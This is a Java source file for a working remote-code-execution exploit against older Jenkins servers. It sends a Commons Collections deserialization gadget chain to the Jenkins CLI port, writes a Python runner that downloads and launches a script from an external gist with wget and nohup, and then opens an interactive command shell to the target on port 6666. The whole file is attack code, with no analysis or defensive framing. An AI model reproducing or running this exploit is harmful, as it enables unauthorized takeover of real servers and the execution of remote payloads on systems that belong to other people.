package exploit;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.io.FileUtils;

import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

public class RequestAttack {

    public static void main(String args[]) throws Exception {
        runAttack();
    }

    private static void runAttack() throws Exception {
        Scanner scan = new Scanner(System.in);
        System.out.print("jenkins server address (example http://localhost:8080/jenkins):");
        final String appUrl = scan.nextLine().trim();
        URI uri = new URI(appUrl);
        final exploit.CliInfo cliInfo = getCliInfo(appUrl);
        int cliPort = cliInfo.getPort();
        if (isVulnerableVersion(cliInfo)) {
            System.out.print("Selected jenkins server vulnerable\n");
        } else {
            throw new Error("Selected jenkins server isn`t vulnerable\n");
        }

        sendPayload(uri, cliPort, getScriptRunnerChain());
        System.out.print("Payload was sent\n");
        System.out.print("Trying connect to server ...\n");
        connectToServer(uri.getHost());
    }

    private static Socket sendPayload(URI uri, int cliPort, ChainedTransformer chainedTransformer) throws Exception {
        Socket socket = new Socket(uri.getHost(), cliPort);
        socket.setKeepAlive(true);
        final OutputStream outputStream = socket.getOutputStream();
        String PREAMBLE_STRING = "<===[JENKINS REMOTING CAPACITY]===>";
        final DataOutputStream dos = new DataOutputStream(outputStream);
        dos.writeUTF("Protocol:CLI-connect");
        byte[] serialize = serialize(payload(chainedTransformer));
        outputStream.write((PREAMBLE_STRING + DatatypeConverter.printBase64Binary(serialize)).getBytes());
        outputStream.flush();
        return socket;
    }

    private static void connectToServer(String host) throws IOException, InterruptedException {
        Thread.sleep(3000);
        testConnection(host);
        System.out.print("Connection was establish\n");

        while (true) {
            Scanner scan = new Scanner(System.in);
            System.out.print("Write command for execute: ");
            Socket socket = new Socket(host, 6666);
            String trim = scan.nextLine().trim();
            final DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
            dos.write(trim.getBytes());
            dos.flush();
            InputStream is = socket.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while ((line = br.readLine()) != null) {
                System.out.println(line);
            }
            dos.close();
            is.close();
            isr.close();
            br.close();
            socket.close();
        }
    }

    private static void testConnection(String host) throws IOException {
        Socket socket = new Socket(host, 6666);
        socket.close();
    }

    private static boolean isVulnerableVersion(exploit.CliInfo cliInfo) {
        String[] split = cliInfo.getVersion().split("\\.", -1);
        return Integer.parseInt(split[0]) <= 1 &&
            Integer.parseInt(split[1]) <= 637;
    }

    private static byte[] serialize(Object obj) throws Exception {
        final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        final ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

        objectOutputStream.writeObject(obj);
        return byteArrayOutputStream.toByteArray();
    }

    private static exploit.CliInfo getCliInfo(String host) throws IOException {
        URL obj = new URL(host);
        URLConnection conn = obj.openConnection();
        final String port = conn.getHeaderField("X-Jenkins-CLI-Port");
        final String version = conn.getHeaderField("X-Jenkins");
        return new exploit.CliInfo(Integer.parseInt(port), version);
    }



    /*
    Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */

    public static InvocationHandler payload(ChainedTransformer chainedTransformer) throws Exception {
        final Map innerMap = new HashMap();

        final LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);

        final Map mapProxy = wrapMapByProxy(lazyMap);

        return (InvocationHandler) getInvocationHandler(mapProxy);
    }

    private static Object getInvocationHandler(Map<?, ?> map)
        throws Exception {
        String className = "sun.reflect.annotation.AnnotationInvocationHandler";
        Constructor<?> declaredConstructor = Class.forName(className).getDeclaredConstructors()[0];
        declaredConstructor.setAccessible(true);
        return declaredConstructor.newInstance(Override.class, map);
    }

    private static Map wrapMapByProxy(Map<?, ?> map)
        throws Exception {
        final Class<?>[] ifaces = { Map.class };
        Object obj = Proxy.newProxyInstance(Map.class.getClassLoader(), ifaces, (InvocationHandler) getInvocationHandler(map));
        Map cast = Map.class.cast(obj);
        return cast;
    }

    public static Object npayload(final String command) throws Exception {
        Map originalMap = new HashMap();
        originalMap.put("value", "value");
        Map decoratedMap = TransformedMap.decorate(originalMap, null, getTransformerChain(command));
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        return ctor.newInstance(Retention.class, decoratedMap);
    }

    public static ChainedTransformer getTransformerChain(String command) {
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class }, new String[] { command })
        };
        return new ChainedTransformer(transformers);
    }

    public static ChainedTransformer getScriptRunnerChain() {
        final String command = "import subprocess\nsubprocess.check_output('wget https://gist.githubusercontent.com/arshtepe/2eb8ebb2f4ef335df64d49bef5f4fa05/raw -O /tmp/xs999.py && nohup python /tmp/xs999.py &', shell=True)";
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(FileUtils.class),
            new InstantiateTransformer(new Class[0], new Object[0]),
            new InvokerTransformer("writeStringToFile", new Class[] { File.class, String.class }, new Object[] { new File("/tmp/runner.py"), command }),
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class }, new String[] { "python /tmp/runner.py" })
        };
        return new ChainedTransformer(transformers);
    }

}
